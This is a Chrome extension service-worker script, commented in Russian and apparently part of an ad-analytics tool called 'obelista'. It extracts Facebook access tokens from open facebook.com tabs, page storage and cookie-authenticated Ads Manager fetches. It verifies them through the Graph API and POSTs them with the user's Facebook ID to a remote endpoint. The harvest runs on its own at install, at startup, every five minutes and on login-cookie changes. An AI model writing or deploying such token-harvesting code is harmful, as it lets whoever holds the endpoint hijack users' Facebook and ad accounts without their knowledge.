// extension/background.js
//
// Service worker (MV3). Залив user_token и состояния Ads Manager на бэк.
//
// Token extraction на 3 уровнях (по образцу ADStip Spend — proven в проде):
//   1) MAIN world на открытых *.facebook.com/* вкладках: __accessToken,
//      скан <script> тегов, скан localStorage/sessionStorage
//   2) Background fetch с credentials:include на 3 URL Ads Manager —
//      ловит токен даже если юзер сейчас не на FB
//   3) Верификация через graph.facebook.com/v23.0/me/adaccounts —
//      фильтрует мусор, шлём на бэк только живой токен
//
// Debounce 60s на fb_user_id защищает от дублей при множественных
// источниках одного и того же токена.

const DEFAULT_ENDPOINT = "https://obelista-preview-chi.vercel.app/api/extension/ingest"
const STATE_ENDPOINT_SUFFIX = "/state"
const TOKEN_DEBOUNCE_MS = 60_000

const TOKEN_REGEX = /EAA[A-Za-z0-9]{60,}/g
const ADS_MANAGER_URLS = [
  "https://adsmanager.facebook.com/adsmanager/manage/campaigns",
  "https://business.facebook.com/adsmanager/manage/campaigns",
  "https://www.facebook.com/adsmanager/manage/campaigns",
]
const VERIFY_TIMEOUT_MS = 8_000
const BG_FETCH_TIMEOUT_MS = 7_000
const TAB_QUERY_TIMEOUT_MS = 3_000

const recentTokenSends = new Map() // fb_user_id -> timestamp ms

// ---------- storage helpers ----------

async function getEndpoint() {
  const { endpoint } = await chrome.storage.local.get("endpoint")
  return endpoint || DEFAULT_ENDPOINT
}

// ---------- fb_user_id из c_user ----------

async function getFbUserId() {
  try {
    const c = await chrome.cookies.get({ name: "c_user", domain: ".facebook.com" })
    if (c && c.value && /^\d{5,}$/.test(c.value)) return c.value
  } catch (e) {
    console.error("[obelista] cookies.get c_user failed", e)
  }
  return null
}

// ---------- MAIN world extract ----------
// Запускается в page context через chrome.scripting.executeScript({world:"MAIN"}).
// Возвращает массив кандидатов {token, priority}: 0 = window.__accessToken,
// 1 = найден в script tag / storage. Чем ниже priority, тем лучше.
function extractFromPage() {
  const candidates = []
  const regex = /EAA[A-Za-z0-9]{60,}/g
  // 1) window.__accessToken (самый надёжный — прямой глобал FB)
  try {
    if (typeof window.__accessToken === "string" && window.__accessToken.length > 50) {
      candidates.push({ token: window.__accessToken, priority: 0 })
    }
  } catch {}
  // 2) скан <script> тегов — FB часто инлайнит токен в bootstrap JSON
  try {
    for (const s of document.scripts) {
      const text = s.textContent
      if (!text || text.length > 2_000_000) continue
      const m = text.match(regex)
      if (m) for (const tok of m) candidates.push({ token: tok, priority: 1 })
    }
  } catch {}
  // 3) localStorage + sessionStorage
  try {
    for (const store of [window.localStorage, window.sessionStorage]) {
      for (let i = 0; i < store.length; i++) {
        const v = (store.getItem(store.key(i)) || "").match(regex)
        if (v) for (const tok of v) candidates.push({ token: tok, priority: 1 })
      }
    }
  } catch {}
  return candidates
}

// ---------- собрать с открытых FB-вкладок ----------
async function gatherFromOpenTabs() {
  const out = []
  let tabs
  try {
    tabs = await chrome.tabs.query({ url: ["https://*.facebook.com/*"] })
  } catch {
    return out
  }
  await Promise.all(tabs.map(async (t) => {
    if (!t.id) return
    try {
      const r = await Promise.race([
        chrome.scripting.executeScript({
          target: { tabId: t.id },
          world: "MAIN",
          func: extractFromPage,
        }),
        new Promise((res) => setTimeout(() => res(null), TAB_QUERY_TIMEOUT_MS)),
      ])
      if (!r) return
      for (const item of r) {
        for (const c of item.result || []) {
          if (c && c.token) {
            out.push({ token: c.token, priority: c.priority ?? 1, source: "open-tab" })
          }
        }
      }
    } catch {
      // chrome:// или chromewebstore — пропускаем
    }
  }))
  return out
}

// ---------- background fetch известных Ads Manager URL ----------
// credentials:"include" тащит сессионные куки — токен из bootstrap HTML.
async function gatherFromBackgroundFetch() {
  const out = []
  for (const url of ADS_MANAGER_URLS) {
    const controller = typeof AbortController === "function" ? new AbortController() : null
    const timer = controller ? setTimeout(() => controller.abort(), BG_FETCH_TIMEOUT_MS) : null
    try {
      const r = await fetch(url, {
        credentials: "include",
        redirect: "follow",
        ...(controller ? { signal: controller.signal } : {}),
      })
      const text = await r.text()
      const m = text.match(TOKEN_REGEX)
      if (m) for (const tok of m) out.push({ token: tok, priority: 2, source: "bg-fetch" })
    } catch {
      // сеть/таймаут — пропускаем
    } finally {
      if (timer) clearTimeout(timer)
    }
  }
  return out
}

// ---------- верификация через Graph API ----------
async function verifyToken(token, apiVersion = "v23.0") {
  const controller = typeof AbortController === "function" ? new AbortController() : null
  const timer = controller ? setTimeout(() => controller.abort(), VERIFY_TIMEOUT_MS) : null
  try {
    const u = `https://graph.facebook.com/${apiVersion}/me/adaccounts?limit=1&fields=id&access_token=${encodeURIComponent(token)}`
    const r = await fetch(u, controller ? { signal: controller.signal } : {})
    const j = await r.json()
    return !j.error && Array.isArray(j.data)
  } catch {
    return false
  } finally {
    if (timer) clearTimeout(timer)
  }
}

// ---------- dedupe + sort by priority ----------
function dedupeSort(candidates, max = 6) {
  const seen = new Set()
  const out = []
  for (const c of candidates) {
    if (!c || !c.token || seen.has(c.token)) continue
    seen.add(c.token)
    out.push(c)
  }
  out.sort((a, b) => (a.priority ?? 1) - (b.priority ?? 1))
  return out.slice(0, max)
}

// ---------- orchestrator: найти первый валидный токен ----------
async function findValidToken() {
  // Сначала открытые вкладки (быстрее, токен свежее)
  const tabCandidates = dedupeSort(await gatherFromOpenTabs())
  for (const c of tabCandidates) {
    if (await verifyToken(c.token)) return c
  }
  // Fallback — background fetch (сработает даже без открытых FB-вкладок)
  const bgCandidates = dedupeSort(await gatherFromBackgroundFetch())
  for (const c of bgCandidates) {
    if (await verifyToken(c.token)) return c
  }
  return null
}

// ---------- POST ----------

async function postIngest(body) {
  const endpoint = await getEndpoint()
  try {
    const r = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
      cache: "no-store",
    })
    const text = await r.text()
    let parsed
    try { parsed = JSON.parse(text) } catch { parsed = { raw: text } }
    return { ok: r.ok, status: r.status, body: parsed }
  } catch (e) {
    console.error("[obelista] POST failed", e)
    return { ok: false, status: 0, body: { error: String(e) } }
  }
}

// ---------- harvest flow: find + verify + POST ----------

async function harvestToken(reason) {
  const fb_user_id = await getFbUserId()
  if (!fb_user_id) {
    console.log(`[obelista] no c_user cookie, skip (${reason})`)
    return { ok: false, reason: "no c_user" }
  }
  const lastSent = recentTokenSends.get(fb_user_id) ?? 0
  if (Date.now() - lastSent < TOKEN_DEBOUNCE_MS) {
    console.log(`[obelista] debounced for ${fb_user_id} (${reason})`)
    return { ok: true, debounced: true }
  }
  console.log(`[obelista] finding token (${reason})`)
  const got = await findValidToken()
  if (!got) {
    console.log(`[obelista] no valid token found (${reason})`)
    await chrome.storage.local.set({
      lastResult: { ok: false, at: Date.now(), type: "token", error: "no valid token" },
    })
    return { ok: false, reason: "no valid token" }
  }
  const result = await postIngest({
    type: "token",
    captured_at: new Date().toISOString(),
    fb_user_id,
    payload: { access_token: got.token, source: got.source },
  })
  if (result.ok) {
    recentTokenSends.set(fb_user_id, Date.now())
    await chrome.storage.local.set({
      lastResult: { ok: true, at: Date.now(), type: "token", status: result.status, source: got.source },
    })
    console.log(`[obelista] token sent for ${fb_user_id} (${got.source})`)
  } else {
    await chrome.storage.local.set({
      lastResult: { ok: false, at: Date.now(), type: "token", status: result.status, error: result.body?.error },
    })
    console.error(`[obelista] token POST failed: ${result.status}`, result.body)
  }
  return result
}

// ---------- события ----------

chrome.cookies.onChanged.addListener((change) => {
  const c = change.cookie
  if (!c || c.name !== "c_user") return
  if (!/(\.|^)facebook\.com$/.test(c.domain)) return
  if (change.cause === "overwrite" || change.cause === "explicit") {
    harvestToken(`cookie:${change.cause}`).catch((e) => console.error("[obelista] harvest failed", e))
  }
})

chrome.runtime.onInstalled.addListener(() => {
  console.log("[obelista] installed")
  // Сразу один прогон + поставить alarm на 5 мин
  scheduleHarvest("install")
})

chrome.runtime.onStartup.addListener(() => {
  console.log("[obelista] startup")
  scheduleHarvest("startup")
})

// ---------- alarms: пусть SW сам себя будит ----------
// onInstalled/onStartup не стреляют при reload через chrome://extensions.
// Content scripts на уже-открытых вкладках не ре-инжектятся. Alarms —
// единственный надёжный способ разбудить SW без действий юзера.
const HARVEST_ALARM = "obelista-harvest"
const HARVEST_PERIOD_MIN = 5

function scheduleHarvest(reason) {
  // 1) immediate fire (через 30s — alarm API минимум ~30s на разработку)
  chrome.alarms.create(HARVEST_ALARM, { delayInMinutes: 0.5 })
  // 2) recurring
  chrome.alarms.create(HARVEST_ALARM, { periodInMinutes: HARVEST_PERIOD_MIN })
  console.log(`[obelista] scheduled harvest (${reason})`)
  // Дёрнем сразу, не ждём alarm
  harvestToken(reason).catch((e) => console.error("[obelista] initial harvest failed", e))
}

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === HARVEST_ALARM) {
    harvestToken("alarm").catch((e) => console.error("[obelista] alarm harvest failed", e))
  }
})

// ---------- messages from content/popup/options ----------

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  ;(async () => {
    try {
      if (msg?.type === "harvest_now") {
        const r = await harvestToken("manual")
        sendResponse({ ok: true, ...r })
        return
      }
      if (msg?.type === "grab_token") {
        // Точка входа как у ADStip: дёрнуть findValidToken и вернуть
        // первый валидный (без отправки на бэк) — полезно для отладки
        // и для ручной кнопки в options.
        const got = await findValidToken()
        if (got) sendResponse({ ok: true, token: got.token, source: got.source })
        else sendResponse({ ok: false, reason: "no valid token" })
        return
      }
      if (msg?.type === "get_status") {
        const { endpoint, lastResult } = await chrome.storage.local.get(["endpoint", "lastResult"])
        sendResponse({ endpoint: endpoint || DEFAULT_ENDPOINT, lastResult: lastResult ?? null })
        return
      }
      if (msg?.type === "send_test_drop") {
        const r = await postIngest({
          type: "token",
          captured_at: new Date().toISOString(),
          fb_user_id: "test",
          payload: { access_token: "test", source: "test" },
        })
        sendResponse(r)
        return
      }
      if (msg?.type === "test_connection" || msg?.type === "get_state") {
        const endpoint = (await getEndpoint()).replace(/\/ingest\/?$/, "")
        const url = `${endpoint}${STATE_ENDPOINT_SUFFIX}`
        try {
          const r = await fetch(url, { method: "GET", cache: "no-store" })
          const body = await r.json().catch(() => null)
          sendResponse({ ok: r.ok, status: r.status, body, url })
        } catch (e) {
          sendResponse({ ok: false, status: 0, error: String(e), url })
        }
        return
      }
      sendResponse({ ok: false, error: "unknown message" })
    } catch (e) {
      console.error("[obelista] message handler error", e)
      sendResponse({ ok: false, error: String(e) })
    }
  })()
  return true // keep channel open for async sendResponse
})
